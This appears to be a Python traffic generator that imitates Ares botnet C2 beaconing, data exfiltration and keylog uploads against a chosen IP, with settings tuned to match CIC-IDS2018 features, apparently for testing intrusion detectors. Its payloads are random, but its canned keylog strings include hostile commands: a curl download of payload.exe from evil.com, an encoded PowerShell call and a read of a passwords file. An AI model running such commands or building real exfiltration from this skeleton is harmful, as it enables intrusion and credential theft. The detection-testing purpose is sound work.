"""
Botnet Attack - C2 beaconing, data exfiltration, and command execution
Replicates CIC-IDS2018 Ares botnet behavior:
  - C2 Beaconing:     Periodic HTTP callbacks to command server at regular intervals
  - Data Exfiltration: Upload "stolen" data in large HTTP POST requests
  - Command Execution: Download "commands" via HTTP GET, execute, report back

Key: Botnet traffic differs from normal browsing because of:
  - Periodic beaconing at regular intervals (predictable timing)
  - HTTP POST exfiltration with large payloads (high TotLen Fwd Pkts)
  - Long-lived connections with idle periods (high Idle Mean/Min)
  - Bidirectional traffic on keep-alive connections
  - Different Fwd Seg Size Min from normal browsers
  - Unusual Init Fwd Win Byts values

The old script just sent 30-byte payloads and closed immediately —
each connection looked like a normal HTTP health check.
"""

import socket
import threading
import time
import random
import string
import base64
import json

# TCP receive buffer sizes → Init Fwd Win Byts feature.
# Values derived from CICIDS2018 training data per-class medians.
# Bot training data: Botnet flows have a LOWER window size than normal traffic.
_RCVBUF_BOTNET = 2053        # Botnet training median: 2053 (characteristic low value)

USER_AGENTS = [
    # Ares/Zeus bots often use generic or outdated user agents
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
    "Python-urllib/3.8",
    "Wget/1.21",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _random_data(size):
    """Generate random bytes that look like encoded stolen data."""
    raw = ''.join(random.choices(string.ascii_letters + string.digits + "+/=", k=size))
    return raw.encode()


class BotnetAttack:
    def __init__(self, target_ip, duration=60, target_port=8080):
        """Initialize botnet attack.
        
        Default target_port=8080 matches CICIDS2018 training data where
        Botnet Dst Port median=8080 (the Ares C2 server port).
        Using port 80 would produce flows that look like normal HTTP
        on the #2 most important feature (Dst Port, 8.7% importance).
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.beacon_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.beacon_count += n

    # ──────────────────────────────────────────────────────
    # C2 Beaconing — Short HTTP callbacks, NEW connection per beacon
    #
    # CICIDS2018 training data profile (Bot class):
    #   Tot Fwd Pkts:    mean=2.56, median=2
    #   TotLen Fwd Pkts: mean=159.5, median=0
    #   Fwd Seg Size Min: 20
    #   Init Fwd Win Byts: median=2053
    #   Dst Port: 8080
    #
    # CRITICAL: Training shows very short flows (2 fwd pkts).
    # Each beacon must be a NEW connection, not keep-alive.
    # ──────────────────────────────────────────────────────
    def c2_beacon(self):
        """C2 beaconing: Simulates Ares-style HTTP callbacks.
        Each beacon is a NEW TCP connection with 1-2 requests,
        matching the training data profile of ~2 fwd pkts per flow."""
        end_time = time.time() + self.duration
        c2_port = self.target_port
        bot_id = _random_string(16)
        seq = 0

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BOTNET)
                sock.connect((self.target_ip, c2_port))

                # Send 1 beacon request per connection (matching training ~2 fwd pkts)
                path = f"/api/check?id={bot_id}&seq={seq}&t={int(time.time())}"
                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Cookie: session={bot_id}\r\n"
                    f"Accept: application/json\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                sock.sendall(req.encode())
                self._inc_count()
                seq += 1

                # Read C2 response
                try:
                    sock.settimeout(2)
                    sock.recv(4096)
                except socket.timeout:
                    pass

                sock.close()
            except Exception:
                pass

            # Wait between beacons (botnet style: regular intervals with jitter)
            time.sleep(random.uniform(3, 8))

    # ──────────────────────────────────────────────────────
    # Data Exfiltration — Upload "stolen" data, NEW connection per upload
    #
    # CICIDS2018 training data shows short flows for Bot class.
    # Each exfil upload must be a NEW TCP connection.
    # ──────────────────────────────────────────────────────
    def data_exfiltration(self):
        """Data exfiltration: Upload payloads simulating stolen data.
        Each upload is a NEW TCP connection with 1 POST request,
        matching the training data profile of ~2 fwd pkts per flow."""
        end_time = time.time() + self.duration
        exfil_port = self.target_port
        bot_id = _random_string(16)

        data_types = ["credentials", "keylog", "clipboard", "screenshots",
                      "browser_history", "cookies", "system_info", "files"]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BOTNET)
                sock.connect((self.target_ip, exfil_port))

                # Send 1 exfil POST per connection (matching training ~2 fwd pkts)
                data_type = random.choice(data_types)
                if data_type in ("screenshots", "files"):
                    payload_size = random.randint(4096, 32768)
                elif data_type in ("credentials", "cookies", "browser_history"):
                    payload_size = random.randint(1024, 8192)
                else:
                    payload_size = random.randint(256, 2048)

                exfil_data = _random_data(payload_size)
                body = (
                    f'{{"id":"{bot_id}","type":"{data_type}",'
                    f'"data":"{base64.b64encode(exfil_data).decode()}",'
                    f'"ts":{int(time.time())}}}'
                )

                req = (
                    f"POST /api/upload HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Cookie: session={bot_id}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                    f"{body}"
                )
                sock.sendall(req.encode())
                self._inc_count()

                # Read server ack
                try:
                    sock.settimeout(2)
                    sock.recv(4096)
                except socket.timeout:
                    pass

                sock.close()
            except Exception:
                pass

            # Exfil happens in bursts with pauses
            time.sleep(random.uniform(2, 6))

    # ──────────────────────────────────────────────────────
    # Keylogger + Command execution — NEW connection per cycle
    #
    # CICIDS2018 training data shows ~2 fwd pkts per Bot flow.
    # Each keylog/command cycle must be a NEW TCP connection.
    # ──────────────────────────────────────────────────────
    def keylog_and_command(self):
        """Keylogger + command polling: sends small keylog POST and
        polls for commands. Each cycle is a NEW TCP connection,
        matching the training data profile of ~2 fwd pkts per flow."""
        end_time = time.time() + self.duration
        bot_id = _random_string(16)
        c2_port = self.target_port

        keylog_snippets = [
            "admin password123 enter",
            "https://bank.example.com tab username tab password enter",
            "ssh root@192.168.1.100 enter",
            "SELECT * FROM users WHERE id=1; enter",
            "net user administrator /active:yes enter",
            "type C:\\Users\\admin\\Documents\\passwords.txt enter",
            "curl http://evil.com/payload.exe -o C:\\temp\\update.exe enter",
            "powershell -enc JABjAGwAaQBlAG4AdA enter",
        ]

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BOTNET)
                sock.connect((self.target_ip, c2_port))

                # Send 1 keylog POST per connection (matching training ~2 fwd pkts)
                keylog = random.choice(keylog_snippets) + f" [{int(time.time())}]"
                body = json.dumps({"id": bot_id, "keylog": keylog})

                req = (
                    f"POST /api/keylog HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                    f"{body}"
                )
                sock.sendall(req.encode())
                self._inc_count()

                # Read response
                try:
                    sock.settimeout(2)
                    sock.recv(4096)
                except socket.timeout:
                    pass

                sock.close()
            except Exception:
                pass

            # Regular interval between cycles (botnet heartbeat)
            time.sleep(random.uniform(1, 4))

    def run_attack(self, num_threads=6):
        """Run botnet attack with multiple threads."""
        print(f"[Botnet] Starting attack on {self.target_ip} for {self.duration}s")
        print(f"[Botnet] Techniques: C2 beaconing + Data exfiltration + Keylog/Command")
        print(f"[Botnet] Using {num_threads} threads")

        techniques = [
            self.c2_beacon,
            self.data_exfiltration,
            self.keylog_and_command,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"Botnet-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[Botnet] Completed in {elapsed:.2f}s — Made {self.beacon_count} C2 connections")


def run_botnet(target_ip, target_port=8080, duration=60, threads=6):
    """Convenience function to run botnet attack.
    Default port=8080 matches CICIDS2018 training data (Botnet Dst Port median=8080)."""
    attack = BotnetAttack(target_ip, duration, target_port=target_port)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_botnet(target_ip, duration=duration)
    else:
        print("Usage: python _5_botnet_behavior.py <target_ip> [duration]")
